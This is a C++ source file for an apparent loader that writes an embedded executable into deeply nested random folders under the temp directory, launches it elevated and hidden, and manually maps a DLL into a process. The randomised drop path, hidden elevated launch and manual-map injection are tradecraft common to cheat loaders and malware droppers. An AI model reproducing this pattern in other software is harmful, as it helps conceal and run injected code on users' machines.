#include "StdInc.h"
#include "EngineLauncher.h"

std::filesystem::path EngineLauncher::GetEnginePath()
{
    SharedUtil::AddDebugLog(__FUNCTION__);

    std::string strEngineSubDirs;
    for (int i = 0; i < 10; ++i)
    {
        strEngineSubDirs += SharedUtil::GenerateRandomString(4);
        if (i < 9)
            strEngineSubDirs += "\\";
    }

    std::filesystem::path EngineDirectory = std::filesystem::path(SharedUtil::GetKnownDirectory(FOLDERID_LocalAppData)) / "temp" / strEngineSubDirs;
    return EngineDirectory / "AtomicSvc.exe";
}

bool EngineLauncher::DumpEngineProcess(const std::filesystem::path& EnginePath, BYTE* pBuffer, size_t BufferSize)
{
    SharedUtil::AddDebugLog(__FUNCTION__);

    std::error_code ec;
    std::filesystem::create_directories(EnginePath.parent_path(), ec);

    if (ec)
    {
        SharedUtil::AddDebugLog("Failed to create directory: ", EnginePath.parent_path().string(), " - Error: ", ec.message());
        return false;
    }

    std::ofstream outFile(EnginePath, std::ios::binary);
    if (!outFile)
    {
        SharedUtil::AddDebugLog("Failed to open file for writing: ", EnginePath.string());
        return false;
    }
    outFile.write(reinterpret_cast<const char*>(pBuffer), BufferSize);
    if (!outFile)
    {
        SharedUtil::AddDebugLog("Failed to write data to file: ", EnginePath.string());
        return false;
    }
    outFile.close();
    return true;
}

EngineLauncher::eLaunchResult EngineLauncher::LaunchEngineProcess(const std::filesystem::path& EnginePath, HANDLE* pHandle)
{
    SharedUtil::AddDebugLog(__FUNCTION__);

    SHELLEXECUTEINFOW sei = {0};
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"runas";            // This triggers elevation
    sei.lpFile = EnginePath.c_str();
    sei.nShow = SW_HIDE;

    if (!ShellExecuteExW(&sei))
    {
        DWORD error = GetLastError();
        if (error == ERROR_CANCELLED)
        {
            SharedUtil::AddDebugLog("User canceled UAC prompt.");
            return eLaunchResult::UAC_CANCELLED;
        }
        else
        {
            SharedUtil::AddDebugLog("Failed to launch with elevation: ", error);
            return eLaunchResult::LAUNCH_ELEVATION_FAILED;
        }
    }

    *pHandle = sei.hProcess;

    return eLaunchResult::SUCCESS;
}

int EngineLauncher::InjectEngineIntoLauncher(const std::filesystem::path& EnginePath, HANDLE hProcess, BYTE* pBuffer, size_t size)
{
    SharedUtil::AddDebugLog(__FUNCTION__);

    return ManualMapDll(hProcess, pBuffer, size);
}